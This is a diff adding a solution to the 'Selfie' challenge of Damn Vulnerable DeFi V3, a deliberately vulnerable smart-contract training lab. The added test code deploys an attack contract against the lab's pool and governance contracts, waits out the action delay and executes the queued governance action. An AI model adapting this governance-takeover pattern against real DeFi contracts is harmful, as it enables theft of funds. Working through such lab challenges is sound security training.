@@ -60,3 +60,17 @@ it('Execution', async function () {
 #Challenge #6
 
 Selfie [ Damn Vulnerable DeFi V3 Challenge 6 Solution: Selfie Walkthrough Guide ]
+
+````
+it('Execution', async function () {
+    /** CODE YOUR SOLUTION HERE */
+    
+    this.attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
+    pool.address, governance.address, token.address
+    );
+    await this.attackContract.attack();
+    const ACTION_DELAY = 3 * 24 * 60 * 60 + 1;
+    await time.increase(ACTION_DELAY);
+    await governance.connect(player).executeAction(1);
+});
+````
